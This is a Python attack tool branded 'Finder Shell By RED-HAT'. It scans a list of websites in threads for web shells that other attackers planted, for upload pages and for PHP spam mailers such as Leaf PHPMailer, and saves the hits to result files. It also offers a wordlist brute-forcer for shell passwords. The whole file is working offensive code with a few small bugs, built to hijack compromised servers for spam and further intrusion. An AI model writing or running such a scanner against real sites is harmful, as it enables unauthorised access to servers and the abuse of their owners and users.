import os
import requests
import threading
from multiprocessing.dummy import Pool,Lock
from bs4 import BeautifulSoup
import time
import smtplib,sys,ctypes
from random import choice
from colorama import Fore
from colorama import Style
from colorama import init
import re
init(autoreset=True)
fr = Fore.RED
gr = Fore.BLUE
fc = Fore.CYAN
fw = Fore.WHITE
fy = Fore.YELLOW
fg = Fore.GREEN
sd = Style.DIM
sn = Style.NORMAL
sb = Style.BRIGHT
def Folder(directory):
  if not os.path.exists(directory):
  	os.makedirs(directory)
Folder("result")
# V-7 
#it's Open Source 
#it's Paid Not Free Dude '
Bad = 0
Good = 0
pro = 0
mailer = 0
password = 0
def clear():
	try:
		if os.name == 'nt':
			os.system('cls')
		else:
			os.system('clear')
	except:
		pass
def finder(i) :
	global Bad,Good,pro,password,mailer
	head = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36'}
	try :
			x = requests.session()
			for script in listaa :
				url = ('https://'+i+'/'+script)
				while True :
					req_first = x.get(url, headers=head)
					if ">public_html" in req_first.text :
						Good = Good + 1
						print(fg+"Found >> "+url)
						with open("result/shell.txt","a") as file :
							file.write(url+"\n")
							file.close()
					elif "<span>Upload file:" in req_first.text :
						Good = Good + 1
						print("generator >> "+url)
						with open("result/random.txt","a") as gn :
							gn.write(url+"\n")
							gn.close()
					elif 'type="submit" id="_upl" value="Upload">' in req_first.text :
						Good = Good + 1
						print("Shell >> "+url)
						with open("result/Config.txt","a") as fox :
							Good = Good + 1
							fox.write(url+"\n")
							fox.close()
					elif 'Leaf PHPMailer' in req_first.text or '>alexusMailer 2.0<' in req_first.text :
						mailer = mailer + 1
						print('Mailer >>  '+url)
						with open('result/Mailer.txt','a') as mailers :
							mailers.write(url+'\n')
							mailers.close()
					elif 'method=post>Password:' in req_first.text or '<input type=password name=pass' in req_first.text :
						password = password + 1
						print('Password : >> '+url)
						with open('result/passwod.txt','a') as pa :
							pa.write(url+'\n')
							pa.close()
					elif 'name="uploader" id="uploader">' in req_first.text:
						good = good +1
						print('{} VULN PAGE : >>{}'.format(fy,url))
						with open('result.txt','a') as fo :
							fo.write(url+'\n')
							fo.close()
					else :
						Bad = Bad + 1
						print(fc+"[ + ] "+fr+"Not found >>> "+i+"  By script Shell "+script)
						pass
					break
	except :
		pass
	if os.name == 'nt':
		ctypes.windll.kernel32.SetConsoleTitleW('Finder Shell |By RED-HAT |Shell- {} |Not-found- {} |Mailer- {}| Password-{}'.format(Good, Bad, mailer, password))
	else :
		sys.stdout.write('\x1b]2; Finder Shell |By RED-HAT |Shell- {} |Not Found- {}| Mailer-{}| Password-{}\x07'.format(Good,Bad, mailer, password))
def key_logo():
    clear = '\x1b[0m'
    colors = [36, 32, 34, 35, 31, 37]
    x = '          [ + ] FINDER Shell RED-HAT \n         [ +] OPEN Source  \n       [ +] Password '
    for N, line in enumerate(x.split('\n')):
        sys.stdout.write('\x1b[1;%dm%s%s\n' % (choice(colors), line, clear))
        time.sleep(0.05)
def run() :
	key_logo()
	clear()
	global listaa
	print("""  
	  [-] -----------------------------------------[-]
	  [+] Finder Shell By RED-HAT (#_#)
	  [+] HI DEAR IT'S NEW SCRIPT WITH NEW OFFERS
	  [+] MAILER / SYM / SHELL / VULN UPLOAD
	  [+] Open source 
	  [+] Past Vuln List Web /
	  [+] You well Got result In file REsult
	  [+] Cantact Me Here : https://www.facebook.com/RED-HAT
	  [+] Good Luck [~]
	  [-] -----------------------------------------[-]
	                      \n \n""")
	file_name = input("URLS LIST ?  : ")
	op = open(file_name,'r').read().splitlines()
	TEXTList = [list.strip() for list in op]
	listaa = open('privat/name.txt','r',errors='ignore').read().splitlines()
	p = Pool(int(input('THREAD : ')))
	p.map(finder, TEXTList)
def crack_password () :
	x = requests.session()
	urll = input('URL FOR CRACK PASSWORD : ')
	passw = open(input('passwordlist : '),'r', errors='ignore').read().splitlines()
	for passs in passw :
		data = {'pass': passs}
		send = x.post(urll, data=data).text
		if 'method=post>Password:' in send :
			print('PASSWORD-false : '+passs)
		else :
			print('password-True : '+passs)
			with open('TRue.txt','a') as output :
				output.write(passw+'\n')
def main() :
	print('[ 1 ] FINDER Shell \n[ 2 ] Crack Password ')
	inp = int(input('choose : '))
	if inp == 1 :
		run()
	elif inp == 2 :
		crack_password()
	else :
		exit()
main()
